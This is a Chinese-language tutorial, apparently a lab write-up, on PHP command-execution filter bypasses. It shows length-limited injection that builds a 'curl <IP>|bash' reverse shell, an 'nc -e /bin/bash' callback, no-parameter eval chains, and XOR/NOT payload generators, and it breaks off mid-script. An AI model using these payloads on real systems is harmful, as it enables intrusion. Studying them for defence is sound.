<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;t-</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;dir</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021154127.png"><br>按字母排序，但是顺序不满足，可以在-t后面加h，不影响命令执行，但是可以改变排序<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021154433.png">  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&gt;v</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021154607.png"><br>但是又有一个问题<code>rev x</code>长度为5，该怎么办呢，于是我们创建一个rev文件，并且使用通配符<code>*v&gt;x</code>,来将<code>rev v</code>的内容写入x  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021155114.png"><br>此处<code>*</code>为通配符，前能匹配rev，后可执行v；<br>为了防止”g”后面有其他文件名造成影响，可以在前面多创建一个文件”g;“，用”;”阻断后面字符的影响。<br>步骤二：构造一个反弹shell  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.1.240|bash</span><br><span class="line">#变形成16进制</span><br><span class="line">curl 0xC0A801F0|bash</span><br></pre></td></tr></table></figure>
<p>构造：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&gt;ash</span><br><span class="line">?cmd=&gt;b\\</span><br><span class="line">?cmd=&gt;\|\\</span><br><span class="line">?cmd=&gt;F0\\</span><br><span class="line">?cmd=&gt;01\\</span><br><span class="line">?cmd=&gt;A8\\</span><br><span class="line">?cmd=&gt;C0\\</span><br><span class="line">?cmd=&gt;0x\\</span><br><span class="line">?cmd=&gt;\ \\</span><br><span class="line">?cmd=&gt;rl\\</span><br><span class="line">?cmd=&gt;cu\\</span><br><span class="line">?cmd=&gt;sh x</span><br><span class="line">?cmd=&gt;sh g</span><br></pre></td></tr></table></figure>
<p>步骤三：反弹回来的shell查看flag<br>python脚本：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">baseurl = &quot;http://192.168.1.6:19080/class09/4/ffff.php?cmd=&quot;</span><br><span class="line">s = requests.session()</span><br><span class="line"># 将ls -t 写入文件g</span><br><span class="line">list=[</span><br><span class="line">    &quot;&gt;g\;&quot;,</span><br><span class="line">    &quot;&gt;g\&gt;&quot;,</span><br><span class="line">    &quot;&gt;ht-&quot;,</span><br><span class="line">    &quot;&gt;sl&quot;,</span><br><span class="line">    &quot;&gt;dir&quot;,</span><br><span class="line">    &quot;*&gt;v&quot;,</span><br><span class="line">    &quot;&gt;rev&quot;,</span><br><span class="line">    &quot;*v&gt;x&quot;</span><br><span class="line">]</span><br><span class="line"># curl 192.168.1.161|bash</span><br><span class="line">list2= [</span><br><span class="line">    &quot;&gt;ash&quot;,</span><br><span class="line">    &quot;&gt;b\\&quot;,</span><br><span class="line">    &#x27;&gt;\|\\&#x27;,</span><br><span class="line">    &#x27;&gt;A1\\&#x27;,</span><br><span class="line">    &#x27;&gt;01\\&#x27;,</span><br><span class="line">    &#x27;&gt;A8\\&#x27;,</span><br><span class="line">    &#x27;&gt;C0\\&#x27;,</span><br><span class="line">    &#x27;&gt;0x\\&#x27;,</span><br><span class="line">    &#x27;&gt;\ \\&#x27;,</span><br><span class="line">    &#x27;&gt;rl\\&#x27;,</span><br><span class="line">    &#x27;&gt;cu\\&#x27;</span><br><span class="line">]</span><br><span class="line">for i in list:</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    url = baseurl+str(i)</span><br><span class="line">    s.get(url)</span><br><span class="line">for j in list2:</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    url = baseurl+str(j)</span><br><span class="line">    s.get(url)</span><br><span class="line">s.get(baseurl+&quot;sh x&quot;)</span><br><span class="line">s.get(baseurl+&quot;sh g&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="无参数命令执行请求头绕过-php7-3"><a href="#无参数命令执行请求头绕过-php7-3" class="headerlink" title="无参数命令执行请求头绕过(php7.3)"></a>无参数命令执行请求头绕过(php7.3)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>解析：<br><code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code>只要在’code’里匹配到<code>[^\W]+\((?R)?\)</code>，则替换为空<br><code>[^\W]+\((?R)?\)</code>正则表达式<code>[^\W]</code>匹配字母数字下划线[A-Za-z0-9]<br><code>[^\W]+\(?\)</code>匹配到”a()”形式的字符串，但是()内不能出现任何参数<br><code>(?R)</code>代表递归，即a(b(c()))都能匹配到<br><code>[^\W]+\((?R)?\)</code>能匹配到a(),a(b(c()))……格式的字符串，且()内不能有任何参数<br>只有a(),a(b(c()))……格式的字符串，能被替换为空<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021162851.png"><br><strong>HTTP请求标头</strong><br><code>getallheaders()</code>获取所有HTTP请求标头<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021163628.png"><br>发送GET请求时所有HTTP请求标头header以Array数组列表方式展现出来<br>pos()显示第一项数据，end()显示最后一项数据，但是<code>getallheaders()</code>是倒着显示数据的<br>那么构造请求<code>?code=eval(pos(getallheaders()));</code>,并将请求数据包中的最后一行的内容改为我们想要执行的命令<code>system(&#39;ls&#39;);</code>即可<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021164422.png"><br><code>apache_request_headers()</code>功能与<code>getallheaders()</code>相似，适用于Apache服务器<br>也可以利用system(‘nc 192.168.1.240 -e &#x2F;bin&#x2F;bash’);进行shell反弹  </p>
<h2 id="无参数全局变量RCE-php5-7"><a href="#无参数全局变量RCE-php5-7" class="headerlink" title="无参数全局变量RCE(php5&#x2F;7)"></a>无参数全局变量RCE(php5&#x2F;7)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>php5版</strong><br><code>get_defined_vars()</code>返回所有已定义变量的值，所组成的数组<br><code>?code=print_r(get_defined_vars());</code>返回数组顺序为GET	-&gt;POST-&gt;COOKIE-&gt;FILES<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021170830.png"><br><code>?code=print_r(pos(get_defined_vars()));&amp;cmd=system(&#39;ls&#39;);</code>使用&amp;加入想要获取的指令<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021171050.png"><br>然后再使用end获取GET的最后一项cmd的值system(‘ls’);<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021171543.png"><br>构造<code>?code=eval(end(pos(get_defined_vars())));&amp;cmd=system(&#39;cat flag&#39;);</code>即可<br>POC：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">files = &#123;</span><br><span class="line">    &quot;system(&#x27;type flag&#x27;);&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(&quot;http://localhost/php_cmd/php80/class10/1.php?code=eval(pos(pos(end(get_defined_vars()))));&quot;, files=files)</span><br><span class="line">print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;))</span><br></pre></td></tr></table></figure>
<h2 id="无参数session-RCE-php5"><a href="#无参数session-RCE-php5" class="headerlink" title="无参数session RCE(php5)"></a>无参数session RCE(php5)</h2><p><code>session_start()</code>启动新会话或者重用现有会话，成功开始会话返回TRUE，反之返回FALSE<br><code>?code=print_r(session_id(session_start()));</code>返回PHPSESSID的值，可以用BP修改PHPSESSID的值<br><code>print_r</code>修改为<code>show_source()</code>，用bp修改PHPSESSID的值为.&#x2F;flag，用<code>show_source()</code>读取flag文件源代码。<br>或者修改外部函数为eval(),修改PHPSESSID的值为命令’phpinfo();’,但无法直接执行，需先把命令’phpinfo();’HEX编码为16进制，写入PHPSESSID<code>Cookie: PHPSESSID=706870696e666f28293b</code><br>再用<code>hex2bin()</code>函数将16进制转换为二进制数,用eval执行<br><code>?code=eval(hex2bin(session_id(session_start())));</code>  </p>
<h2 id="无参数scandir读取"><a href="#无参数scandir读取" class="headerlink" title="无参数scandir读取"></a>无参数scandir读取</h2><p><code>scandir</code>类似ls，在某文件路径下，把内容以列表形式显示出来  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">I. scandir()——列出指定路径中的文件和目录(PHP 5, PHP7,PHP 8)</span><br><span class="line">ll. getcwd()——取得当前工作目录(PHP 4,PHP 5, PHP 7,PHP 8)</span><br><span class="line">III. current()——返回数组中的当前值(PHP 4,PHP 5, PHP 7,PHP 8)</span><br><span class="line">lV. array_reverse()——返回单元顺序相反的数组(PHP 4, PHP 5, PHP 7, PHP 8)</span><br><span class="line">V. array_flip()——交换数组中的键和值(PHP 4,PHP 5,PHP 7,PHP 8)</span><br><span class="line">Vl. next()——将数组中的内部指针向前移动(PHP 4,PHP 5, PHP 7,PHP 8)</span><br><span class="line">VII. array_rand——从数组中随机取出一个或多个随机键</span><br><span class="line">VIII.chdir()——系统调用函数(同cd)，用于改变当前工作目录</span><br><span class="line">IX. strrev()——用于反转给定的字符串</span><br><span class="line">X. crypt()——用来来加密，目前Linux平台上加密的方法大致有MD5, DES,3 DES</span><br><span class="line">Xl. hebrevc()——把希伯来文本从右至左的流转换为左至右的流</span><br></pre></td></tr></table></figure>
<p><strong>当前目录</strong><br>查看当前目录：<br><code>?code=print_r(localeconv());</code><br>localeconv()显示的数组第一项为”.”<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021181645.png"><br>使用current()取得第一个点，再使用scandir()获取文件名<br><code>?code=print_r(scandir(current(localeconv())));</code><br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021182155.png"><br>使用<code>array_reverse()</code>，再用current()取得第一个flag的内容，再将<code>print_r</code>改为<code>show_source</code>得到<code>?code=show_source(current(array_reverse(scandir(current(localeconv())))));</code>，从而获取到flag<br><strong>getcwd</strong><br>查看和读取当前目录文件，<code>?code=print_r(getcwd());</code><br><code>getcwd()</code>获取当前绝对路径<br><code>?code=print_r(scandir(getcwd()));</code>,<br><code>?code=print_r(end(scandir(getcwd())));</code>,<br><code>?code=show_source(end(scandir(getcwd())));</code><br><code>dirname()</code>获取上一级目录，<code>?code=print_r(dirname(getcwd()));</code>相当于<code>cd ..</code><br><code>?code=print_r(chdir(dirname(getcwd())));</code>，这里必须使用一个chdir(),相当于将工作目录更改到上一级目录去，从而才能调用上一级目录的文件，否则工作目录一直在1.php这个目录，是无法访问到上一级目录的文件的<br>构造<code>?code=print_r(scandir(dirname(chdir(dirname(getcwd())))));</code><br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021194246.png"><br>即可构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(end(scandir(dirname(chdir(dirname(getcwd()))))));</span><br></pre></td></tr></table></figure>
<p>读取成功info.php的内容<br>或者使用<code>array_flip</code>将键和值对调，然后用<code>array_rand</code>随机获取键名<br>即构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure>
<p>另外两种类似的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line">?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br></pre></td></tr></table></figure>
<p><strong>根目录</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(array());</span><br><span class="line">?code=print_r(serialize(array()));</span><br><span class="line"># serialize序列化</span><br><span class="line">?code=print_r(crypt(serialize(array())));</span><br><span class="line"># crypt单向字符串散列加密，结果随机，使末尾出现/</span><br><span class="line">?code=print_r(strrev(crypt(serialize(array()))));</span><br><span class="line"># 倒序，使/出现在第一个字符，因为ord()函数和chr()函数只能对第一个字符进行转码，ord()编码，chr()解码</span><br><span class="line">?code=print_r(chr(ord(strrev(crypt(serialize(array()))))));</span><br><span class="line"># 得到斜杠/</span><br><span class="line">?code=print_r(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))));</span><br><span class="line"># 读取到根目录</span><br><span class="line">?code=print_r(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array()))))))))));</span><br><span class="line"># 交换键和值</span><br><span class="line">?code=print_r(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));</span><br><span class="line"># 随机获取键</span><br><span class="line">?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));</span><br></pre></td></tr></table></figure>
<p>由于随机性太强，使用bp爆破重复发包即可</p>
<h2 id="无字母数字异或运算绕过"><a href="#无字母数字异或运算绕过" class="headerlink" title="无字母数字异或运算绕过"></a>无字母数字异或运算绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>异或运算</strong><br>如果a，b两个值不相同，则异或结果为1。如果a，b两个值相同，异或结果为0。<br>两个字符进行异或实际上是他们的ASCII码二进制进行异或运算，则我们可以使用符号进行异或运算，获取想要得到的值<br>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function o()&#123;</span><br><span class="line">	echo &quot;hello hacker!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$_ = &quot;5&quot;^&quot;Z&quot;;</span><br><span class="line">$_();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以成功触发函数<br>异或运算生成脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$shell = $_GET[&quot;cmd&quot;];</span><br><span class="line">$result1 = &quot;&quot;;</span><br><span class="line">$result2 = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">function judge($c)</span><br><span class="line">&#123;</span><br><span class="line">    if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$c))</span><br><span class="line">    &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for($num=0;$num&lt;=strlen($shell);$num++)</span><br><span class="line">&#123;</span><br><span class="line">    for($x=33;$x&lt;=126;$x++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(judge(chr($x)))</span><br><span class="line">        &#123;</span><br><span class="line">            for($y=33;$y&lt;=126;$y++)</span><br><span class="line">            &#123;</span><br><span class="line">                if(judge(chr($y)))</span><br><span class="line">                &#123;</span><br><span class="line">                    $f = chr($x)^chr($y);</span><br><span class="line">                    if($f == $shell[$num])</span><br><span class="line">                    &#123;</span><br><span class="line">                        $result1 .= chr($x);</span><br><span class="line">                        $result2 .= chr($y);</span><br><span class="line">                        break 2;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;异或运算第一部分： &quot;.$result1;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;异或运算第二部分： &quot;.$result2;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>通过cmd提交想要执行的命令即可<br>“+(+).&amp;&#x2F;“^”[@[@@@@”&#x3D;phpinfo<br><code>?cmd=$_=&quot;+(+).&amp;/&quot;^&quot;[@[@@@@&quot;;$_();</code><br>则<code>eval($_=&quot;+(+).&amp;/&quot;^&quot;[@[@@@@&quot;;$_();)</code><br><code>$_=phpinfo</code>;则<code>$_();=phpinfo();</code><br>eval成功执行phpinfo();<br>但是由于+会被url识别为空格，所以提交时进行一下url编码再提交<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021204647.png"><br>** PHP5**  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert($_POST[&#x27;_&#x27;]);</span><br></pre></td></tr></table></figure>
<p>我们可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &#x27;assert&#x27;;</span><br><span class="line">$b = &#x27;_POST&#x27;;</span><br><span class="line">$c = $$b;</span><br><span class="line">//$c = $_POST;</span><br><span class="line">$a($c[&#x27;_&#x27;]);</span><br><span class="line">//assert($_POST[&#x27;_&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>现在来考虑过滤的问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">由于字母被过滤，所以把abc分别替换为_,__,___,</span><br><span class="line">assert替换为&quot;!((%)(&quot;^&quot;@[[@[\&quot;,</span><br><span class="line">_POST替换为&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_ = &quot;!((%)(&quot;^&quot;@[[@[\\&quot;;</span><br><span class="line">//存在\，在构造时要在前面加个\转义</span><br><span class="line">$__ = &quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;</span><br><span class="line">$___ = $$__;</span><br><span class="line">$_($___[&#x27;_&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>所以提交</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$_ = &quot;!((%)(&quot;^&quot;@[[@[\\&quot;;$__ = &quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;$___ = $$__;$_($___[&#x27;_&#x27;]);</span><br></pre></td></tr></table></figure>
<p>并且同时POST提交<code>_=system(&#39;ls&#39;);</code><br><strong>PHP7</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$_POST[_]`;</span><br></pre></td></tr></table></figure>
<p>于是构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_ = &#x27;_POST&#x27;;</span><br><span class="line">$__ = $$_;</span><br><span class="line">`$__[_]`;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>现在来替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_POST替换为&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;</span><br></pre></td></tr></table></figure>
<p>所以payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$_ = &quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;$__ = $$_;`$__[_]`;</span><br></pre></td></tr></table></figure>
<p>由于反引号命令执行没有回显，所以POST提交使用反弹shell的命令  </p>
<h2 id="无字母数字取反绕过"><a href="#无字母数字取反绕过" class="headerlink" title="无字母数字取反绕过"></a>无字母数字取反绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>取反运算</strong><br><code>~()</code>，0b0110取反得到0b1001，例如<code>a</code>的二进制为01100001取反得到10011110，转化为ASCII码为9E，而字母数字的ASCII码的16进制最大为7F  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;%9E&quot;;</span><br><span class="line">$b = ~(urldecode($a));</span><br><span class="line">echo $b;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>运行得到字符a<br>取反POC生成脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$shell = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">$result = &quot;&quot;;</span><br><span class="line">$arr =array();</span><br><span class="line">$word = &quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺</span><br><span 